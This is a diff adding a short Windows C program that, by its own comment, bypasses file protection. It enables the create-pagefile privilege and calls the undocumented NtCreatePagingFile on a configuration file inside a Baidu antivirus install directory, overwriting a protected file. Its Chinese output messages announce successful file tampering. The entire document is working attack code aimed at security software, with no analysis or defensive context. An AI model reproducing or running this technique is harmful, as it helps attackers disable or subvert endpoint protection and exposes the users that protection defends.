@@ -1,0 +1,85 @@
+//use to bypass file protection
+#include "stdio.h"
+#include <tchar.h>
+#include <Windows.h>
+
+typedef __success(return >= 0) LONG NTSTATUS;
+
+typedef struct _UNICODE_STRING {
+USHORT Length;
+USHORT MaximumLength;
+PWCH Buffer;
+} UNICODE_STRING;
+typedef UNICODE_STRING *PUNICODE_STRING;
+typedef const UNICODE_STRING *PCUNICODE_STRING;
+
+#define PAGE_SIZE 0x1000
+
+typedef
+NTSTATUS
+(*pfnNtCreatePagingFile) ( IN PUNICODE_STRING PageFileName,
+IN PLARGE_INTEGER InitialSize,
+IN PLARGE_INTEGER MaximumSize,
+IN ULONG Reserved
+);
+
+BOOL AdjustPrivilege(BOOL bEnable)
+{
+BOOL bOk = FALSE;
+HANDLE hToken;
+
+if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
+{
+TOKEN_PRIVILEGES tp;
+tp.PrivilegeCount = 1;
+LookupPrivilegeValue(NULL, SE_CREATE_PAGEFILE_NAME, &tp.Privileges[0].Luid);
+tp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
+AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+bOk = (GetLastError() == ERROR_SUCCESS);
+CloseHandle(hToken);
+}
+
+return bOk;
+}
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+if (!AdjustPrivilege(TRUE))
+{
+MessageBox(NULL, "提升权限失败", "ERROR", MB_OK);
+return -1;
+}
+
+pfnNtCreatePagingFile NtCreatePagingFile = (pfnNtCreatePagingFile)GetProcAddress(LoadLibrary("ntdll.dll"), "NtCreatePagingFile");
+if (!NtCreatePagingFile)
+{
+MessageBox(NULL, "获取函数地址失败", "ERROR", MB_OK);
+return -1;
+}
+
+UNICODE_STRING unPageFile;
+WCHAR *szFile = NULL;
+
+szFile = L"\\??\\C:\\Program Files\\baidu\\baidusd\\1.0.0.352\\NetService.ini";
+
+unPageFile.Length = wcslen(szFile) * sizeof(WCHAR);
+unPageFile.MaximumLength = (wcslen(szFile) + 1) * sizeof(WCHAR);
+unPageFile.Buffer = szFile;
+
+LARGE_INTEGER InitialSize, MaximumSize;
+InitialSize.QuadPart = 1000 * PAGE_SIZE;
+MaximumSize.QuadPart = 2000 * PAGE_SIZE;
+
+NTSTATUS status = NtCreatePagingFile(&unPageFile, &InitialSize, &MaximumSize, NULL);
+if (status == 0)
+{
+printf("篡改文件成功: %S\n", szFile);
+}
+else
+{
+printf("status: 0x%08X\n", status);
+}
+
+getchar();
+exit(0);
+} 
